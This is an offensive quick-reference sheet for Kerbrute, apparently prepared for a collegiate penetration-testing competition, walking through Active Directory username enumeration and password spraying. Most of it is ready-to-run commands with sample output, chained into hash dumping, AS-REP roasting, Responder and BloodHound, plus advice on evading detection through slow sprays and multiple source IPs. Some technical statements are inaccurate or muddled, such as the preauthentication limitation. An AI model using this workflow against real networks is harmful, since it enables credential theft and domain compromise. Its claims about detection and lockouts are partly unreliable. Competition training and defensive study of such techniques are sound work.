# Kerbrute - CPTC Quick Reference

## What is Kerbrute & Why It's Critical

**Kerbrute = Fast AD username enumeration & password spraying via Kerberos**

**Why you need it for CPTC:**
- ✅ Find valid usernames WITHOUT credentials (pre-auth required)
- ✅ Password spray without triggering lockouts (Kerberos pre-auth check only)
- ✅ Extremely fast (thousands of attempts per second)
- ✅ Stealthy (no NTLM, just Kerberos pre-auth)
- ✅ Works from external network (just needs port 88/UDP+TCP)

**Speed:** 
- Username enum: 100-1000 users/second
- Password spray: 10-50 attempts/second

**Use Case:** First step when you have NO credentials yet

---

## Installation (One-Time)

```bash
# Download latest release
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Verify
kerbrute --help

# Or install via Go
go install github.com/ropnop/kerbrute@latest
```

---

## Core Concept - How Kerbrute Works

**Kerberos Pre-Authentication Check:**
```
You → "Does user 'john' exist?" → DC
DC → "Yes, but wrong password" (user exists!)
DC → "No such user" (invalid username)
```

**Key Advantage:** 
- ❌ **Doesn't count as failed login** (no lockout trigger)
- ✅ **Very fast** (Kerberos UDP responses)
- ✅ **Stealthy** (normal Kerberos traffic)

**Limitation:**
- Only works if Kerberos pre-auth required (default for most accounts)
- Won't find accounts with "Do not require Kerberos preauthentication" disabled

---

## Two Essential Commands

### 1. Username Enumeration (Most Important)

**When:** You have NO credentials, need valid usernames

```bash
# Basic enumeration
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt

# With verbose output
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt -v

# Save valid users to file
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt -o valid-users.txt
```

**Output:**
```
2025/10/24 18:35:51 >  Using KDC(s):
2025/10/24 18:35:51 >   10.10.10.10:88

2025/10/24 18:35:52 >  [+] VALID USERNAME:       administrator@corp.local
2025/10/24 18:35:52 >  [+] VALID USERNAME:       john.doe@corp.local
2025/10/24 18:35:52 >  [+] VALID USERNAME:       sqlservice@corp.local
2025/10/24 18:35:53 >  Done! Tested 1000 usernames (3 valid) in 2.156 seconds
```

**Time: 1-2 minutes for 1000 usernames**

---

### 2. Password Spraying

**When:** You have valid usernames, want to find weak passwords

```bash
# Single password spray
kerbrute passwordspray --dc 10.10.10.10 -d corp.local valid-users.txt 'Welcome2024!'

# Verbose output
kerbrute passwordspray --dc 10.10.10.10 -d corp.local valid-users.txt 'Password123' -v

# Save successful logins
kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.txt 'Summer2024!' -o sprayed.txt
```

**Output:**
```
2025/10/24 18:36:15 >  Using KDC(s):
2025/10/24 18:36:15 >   10.10.10.10:88

2025/10/24 18:36:16 >  [+] VALID LOGIN:  john.doe@corp.local:Welcome2024!
2025/10/24 18:36:17 >  Done! Tested 50 logins (1 successes) in 1.523 seconds
```

**Time: 30 seconds to 2 minutes (depends on user count)**

---

## CPTC Workflows

### Scenario 1: Zero Credentials - Need Initial Access

**Step 1: Generate Username List**

```bash
# Use common username formats
cat > potential-users.txt << EOF
administrator
admin
guest
support
helpdesk
john.doe
jane.smith
j.doe
jdoe
john
jane
sqlservice
webservice
backup
EOF
```

**Better: Use SecLists**
```bash
# Common usernames
cat /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | head -1000 > users.txt

# Or top-usernames-shortlist
cp /usr/share/seclists/Usernames/top-usernames-shortlist.txt users.txt
```

---

**Step 2: Enumerate Valid Users**

```bash
# Fast enumeration
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt -o valid-users.txt

# Wait 1-2 minutes
# Check results:
cat valid-users.txt
```

**What you get:** List of valid domain usernames

---

**Step 3: Password Spray (Carefully!)**

```bash
# Try ONE common password
kerbrute passwordspray --dc 10.10.10.10 -d corp.local valid-users.txt 'Welcome2024!'

# If no hits, try another (WAIT 30+ minutes between attempts!)
kerbrute passwordspray --dc 10.10.10.10 -d corp.local valid-users.txt 'Password123'
```

**⚠️ WARNING:** 
- Only spray 1-3 passwords per day
- Wait 30-60 minutes between sprays
- Check lockout policy first (default is often 5 attempts)

---

**Step 4: Use Found Credentials**

```bash
# If found: john.doe:Welcome2024!

# Verify with crackmapexec
crackmapexec smb 10.10.10.10 -u john.doe -p 'Welcome2024!' -d corp.local

# If valid → Run BloodHound
bloodhound-python -u john.doe -p 'Welcome2024!' -d corp.local -ns 10.10.10.10 -c All --zip

# Run Certipy
certipy find -u john.doe@corp.local -p 'Welcome2024!' -dc-ip 10.10.10.10 -vulnerable
```

**Total Time: 5-10 minutes from zero to domain user**

---

### Scenario 2: Password Spray with Organizational Intelligence

**Use company/season-based passwords:**

```bash
# Create targeted password list
cat > passwords.txt << EOF
Welcome2024!
Fall2024!
Winter2024!
CorpName2024!
Password123
CompanyName123!
EOF

# Spray ONE password at a time (with delays)
for pass in $(cat passwords.txt); do
    echo "[*] Trying: $pass"
    kerbrute passwordspray --dc 10.10.10.10 -d corp.local valid-users.txt "$pass" -o results.txt
    echo "[*] Waiting 30 minutes before next spray..."
    sleep 1800  # 30 minutes
done
```

**Time: Hours (due to required delays)**

**CPTC Reality:** Usually only have time for 1-2 spray attempts

---

## Username Generation Strategies

### Method 1: SecLists (Pre-Made)

```bash
# Top 100 common usernames
head -100 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt > users.txt

# Specific lists
ls /usr/share/seclists/Usernames/
# Names/
# top-usernames-shortlist.txt
# xato-net-10-million-usernames.txt
```

---

### Method 2: Generate from Employee Names

**If you have employee names (LinkedIn, company website):**

```bash
# Install username-anarchy
git clone https://github.com/urbanadventurer/username-anarchy
cd username-anarchy

# Generate usernames from names
./username-anarchy "John Doe" > john-doe-usernames.txt

# Output formats:
# john.doe
# j.doe
# jdoe
# johnd
# doej
# john_doe
# etc.
```

---

### Method 3: Company-Specific Patterns

```bash
# Common patterns for CorpName company:
cat > users.txt << EOF
admin
administrator
support
helpdesk
corpname-admin
backup-service
sql-service
web-service
dev-admin
it-support
EOF
```

---

## Command Options Reference

### userenum Options

```bash
kerbrute userenum [options] [userlist]

# Required:
--dc DC_IP              # Domain Controller IP
-d DOMAIN               # Domain name (corp.local)
[userlist]              # File with usernames (one per line)

# Optional:
-o FILE                 # Output valid usernames to file
-v                      # Verbose output
-t THREADS              # Number of threads (default: 10)
--safe                  # Safe mode (slower, more reliable)
```

**Example:**
```bash
kerbrute userenum --dc 10.10.10.10 -d corp.local -o valid.txt -t 20 users.txt
```

---

### passwordspray Options

```bash
kerbrute passwordspray [options] [userlist] [password]

# Required:
--dc DC_IP              # Domain Controller IP
-d DOMAIN               # Domain name
[userlist]              # File with valid usernames
[password]              # Single password to spray

# Optional:
-o FILE                 # Output successful logins
-v                      # Verbose
-t THREADS              # Threads (default: 10)
--safe                  # Safe mode
```

**Example:**
```bash
kerbrute passwordspray --dc 10.10.10.10 -d corp.local -o success.txt users.txt 'Welcome2024!'
```

---

### bruteuser Option (Advanced)

**Brute force single user (DANGEROUS - causes lockouts):**

```bash
kerbrute bruteuser --dc 10.10.10.10 -d corp.local passwords.txt administrator

# ⚠️ WARNING: Will lock out account!
# Only use if:
# - You know lockout policy is disabled
# - Testing your own account
# - Authorized test with backup plan
```

**CPTC:** Skip this (too risky)

---

## Thread Tuning

### Default (10 threads)
```bash
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt
# Speed: ~100 checks/sec
```

### Fast (50 threads)
```bash
kerbrute userenum --dc 10.10.10.10 -d corp.local -t 50 users.txt
# Speed: ~500 checks/sec
# More noisy, may get rate-limited
```

### Safe (5 threads)
```bash
kerbrute userenum --dc 10.10.10.10 -d corp.local -t 5 --safe users.txt
# Speed: ~50 checks/sec
# Stealthier, more reliable
```

**CPTC:** Default (10 threads) is fine

---

## Password Spray Safety Guidelines

### Account Lockout Policy Check

**Before spraying, find lockout policy:**

```bash
# With valid creds (if you have any):
crackmapexec smb 10.10.10.10 -u user -p pass --pass-pol

# Output shows:
# Account Lockout Threshold: 5
# Account Lockout Duration: 30 minutes
# Reset Account Lockout Counter: 30 minutes
```

**Without creds:**
```bash
# Use enum4linux or ldapsearch
enum4linux -P 10.10.10.10 | grep -i lockout

# Or guess (common defaults):
# - Threshold: 5 attempts
# - Duration: 30 minutes
# - Reset: 30 minutes
```

---

### Safe Password Spray Rules

1. **Never exceed threshold - 1**
   - Policy: 5 attempts → Max 4 sprays per day
   - Policy: 3 attempts → Max 2 sprays per day

2. **Wait between sprays**
   - Minimum: 30 minutes
   - Recommended: 60 minutes
   - Safest: 2-3 hours

3. **Start with high-probability passwords**
   - `Welcome2024!` (current season + year)
   - `Password123`
   - `CompanyName123!`
   - `Summer2024!` / `Fall2024!` / etc.

4. **Monitor for success**
   - If ANY password works → Stop spraying
   - Use found creds immediately

---

### Password Spray Timing Calculator

```bash
# Example:
# - Lockout threshold: 5
# - Safe attempts: 3 per day
# - Users to spray: 50
# - Delay between sprays: 1 hour

# Time calculation:
# Spray 1 user = 1 second
# Spray all 50 users = 50 seconds
# Wait 1 hour between sprays
# Total for 3 passwords = (50s × 3) + (1h × 2) = 2.5 minutes + 2 hours

# Realistic CPTC: You have time for 1-2 sprays maximum
```

---

## Common Username Formats

**Most common AD username formats:**

| Format | Example | Notes |
|--------|---------|-------|
| first.last | john.doe | Most common |
| firstlast | johndoe | Common |
| flast | jdoe | Common |
| first | john | Less common |
| lastf | doej | Rare |
| first_last | john_doe | Some orgs |
| f.last | j.doe | Some orgs |

**Generate all formats:**
```bash
# For "John Doe":
cat > usernames.txt << EOF
john.doe
johndoe
jdoe
john
doej
john_doe
j.doe
EOF
```

---

## Time Expectations

### Username Enumeration

| User Count | Time (10 threads) | Time (50 threads) |
|------------|-------------------|-------------------|
| 100 users  | 10-15 sec        | 2-3 sec          |
| 1,000 users| 1-2 min          | 20-30 sec        |
| 10,000 users| 10-15 min       | 3-5 min          |

---

### Password Spraying

| User Count | Time per Password | With 1hr Delays (3 passwords) |
|------------|-------------------|-------------------------------|
| 50 users   | 30-60 sec        | ~2 hours                      |
| 100 users  | 1-2 min          | ~2 hours                      |
| 500 users  | 5-10 min         | ~2 hours                      |

**CPTC Reality:** Budget 1-2 password sprays only

---

## Integration with Other Tools

### Kerbrute → Impacket

```bash
# 1. Kerbrute finds valid creds
kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.txt 'Welcome2024!'
# Output: [+] VALID LOGIN: john.doe@corp.local:Welcome2024!

# 2. Verify with Impacket
crackmapexec smb 10.10.10.10 -u john.doe -p 'Welcome2024!' -d corp.local

# 3. Dump hashes
impacket-secretsdump 'corp.local/john.doe:Welcome2024!@10.10.10.10'
```

---

### Kerbrute → BloodHound

```bash
# 1. Find valid users
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt -o valid.txt

# 2. Try AS-REP roasting (no password needed!)
impacket-GetNPUsers corp.local/ -usersfile valid.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt

# 3. If AS-REP hash found, crack it
hashcat -m 18200 asrep.txt rockyou.txt

# 4. Use cracked creds in BloodHound
bloodhound-python -u user -p cracked-pass -d corp.local -ns 10.10.10.10 -c All --zip
```

---

### Kerbrute → Responder (If No Creds)

```bash
# 1. Kerbrute finds valid usernames
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt -o valid.txt

# 2. Start Responder (parallel attack)
sudo responder -I eth0 -wrf

# 3. Wait for NTLM hashes from network
# 4. Crack hashes, use for access
```

---

## Detection Evasion

### Indicators Kerbrute Creates

**Good (Hard to Detect):**
- ✅ Normal Kerberos pre-auth requests (port 88)
- ✅ Legitimate-looking traffic
- ✅ No failed logins in Security log (for invalid users)

**Bad (Detectable):**
- ⚠️ High volume of Kerberos requests from single IP
- ⚠️ Many requests in short time
- ⚠️ Event ID 4768 failures (invalid usernames)
- ⚠️ Event ID 4771 (valid user, wrong password)

---

### Stealth Techniques

**1. Slow Down (Use --safe and fewer threads)**
```bash
kerbrute userenum --dc 10.10.10.10 -d corp.local -t 5 --safe users.txt
# Slower but blends with normal traffic
```

**2. Space Out Sprays**
```bash
# Instead of 3 sprays in 2 hours:
# Day 1: 1 spray
# Day 2: 1 spray
# Day 3: 1 spray
```

**3. Use Multiple Source IPs (Advanced)**
```bash
# Split user list across multiple VMs/IPs
# VM1: Test users 1-100
# VM2: Test users 101-200
# Looks like different attackers/normal traffic
```

**CPTC:** Usually don't need stealth (blue team doesn't monitor live)

---

## Common Errors & Fixes

### Error: "Couldn't find any KDCs"

**Cause:** Can't reach DC on port 88

**Fix:**
```bash
# Test connectivity
nc -zv 10.10.10.10 88

# Check UDP too (Kerberos uses UDP primarily)
sudo nmap -sU -p 88 10.10.10.10

# Try specifying port explicitly
kerbrute userenum --dc 10.10.10.10:88 -d corp.local users.txt
```

---

### Error: "Network is unreachable"

**Cause:** Wrong DC IP or network issue

**Fix:**
```bash
# Verify DC IP
nslookup corp.local
# Or
dig corp.local

# Test ping
ping 10.10.10.10
```

---

### No Valid Users Found

**Cause:** Wrong domain name or username format

**Fix:**
```bash
# Try different domain formats:
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt
kerbrute userenum --dc 10.10.10.10 -d CORP users.txt
kerbrute userenum --dc 10.10.10.10 -d corp users.txt

# Try @domain format in username file:
# john.doe@corp.local
# john.doe
```

---

### Very Slow Enumeration

**Cause:** Network issues or rate limiting

**Fix:**
```bash
# Reduce threads
kerbrute userenum --dc 10.10.10.10 -d corp.local -t 5 users.txt

# Use --safe mode
kerbrute userenum --dc 10.10.10.10 -d corp.local --safe users.txt
```

---

## CPTC Decision Tree

```
No domain credentials yet?
├─ YES
│   ├─ Have potential usernames?
│   │   ├─ YES → Kerbrute userenum
│   │   └─ NO → Generate usernames (SecLists/employee names)
│   │
│   ├─ Found valid users?
│   │   ├─ YES
│   │   │   ├─ Try AS-REP roasting (GetNPUsers.py)
│   │   │   ├─ Try 1 password spray (safe password)
│   │   │   └─ If nothing → Move to other attacks
│   │   │
│   │   └─ NO → Try different username formats
│   │
│   └─ Got valid creds from spray?
│       └─ YES → BloodHound + Certipy immediately
│
└─ NO (already have creds)
    └─ Skip Kerbrute, use existing creds
```

---

## Evidence Collection

**For enumerated users:**
```bash
# Command
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt -o valid.txt

# Output
cat valid.txt
# john.doe@corp.local
# admin@corp.local
# sqlservice@corp.local

# Screenshot of Kerbrute output
```

**For password spray success:**
```
# Command
kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.txt 'Welcome2024!'

# Output
[+] VALID LOGIN:  john.doe@corp.local:Welcome2024!

# Impact
Valid domain credentials obtained via password spray.
User 'john.doe' authenticated with weak password 'Welcome2024!'
Credentials used for further enumeration and privilege escalation.
```

---

## Quick Command Reference

```bash
# Username enumeration (basic)
kerbrute userenum --dc DC_IP -d DOMAIN users.txt

# Save valid users to file
kerbrute userenum --dc DC_IP -d DOMAIN users.txt -o valid-users.txt

# Verbose output
kerbrute userenum --dc DC_IP -d DOMAIN users.txt -v

# Password spray
kerbrute passwordspray --dc DC_IP -d DOMAIN users.txt 'Password123'

# Save successful logins
kerbrute passwordspray --dc DC_IP -d DOMAIN users.txt 'Welcome2024!' -o success.txt

# Adjust threads (default 10)
kerbrute userenum --dc DC_IP -d DOMAIN -t 20 users.txt

# Safe mode (slower, more reliable)
kerbrute userenum --dc DC_IP -d DOMAIN --safe users.txt
```

---

## Time Budget for CPTC

### Recommended Allocation

**Initial Recon (15 minutes):**
```
1. Generate/collect username list (5 min)
2. Kerbrute userenum (2-3 min)
3. Review results, filter valid users (2 min)
4. Try AS-REP roasting on valid users (2 min)
5. ONE password spray attempt (2 min)
6. Verify any found creds (1 min)
```

**If No Success After 15 Minutes:**
- Move to other attack vectors
- Leave password spray running with delays (background)
- Focus on other enumeration (web apps, services, etc.)

---

## Final Tips

**Do's:**
- ✅ Use SecLists for username enumeration
- ✅ Start with most common password (Welcome2024!, Password123)
- ✅ Immediately verify any found creds
- ✅ Try AS-REP roasting after finding valid users
- ✅ Document all valid usernames (useful later)

**Don'ts:**
- ❌ Don't spray more than 2-3 passwords in CPTC timeframe
- ❌ Don't ignore lockout policy (if you can determine it)
- ❌ Don't brute force single user (use bruteuser)
- ❌ Don't spend > 15 minutes if not getting results
- ❌ Don't spray without checking for AS-REP roastable users first

**Remember:**
```
Kerbrute → Valid users → AS-REP roast → Password spray → Creds → BloodHound/Certipy → DA
```

**Total realistic time: 10-20 minutes including follow-up attacks**

**Key Success Metric:** 
- Getting even ONE valid credential unlocks entire domain enumeration
- Focus on that first win, then pivot fast
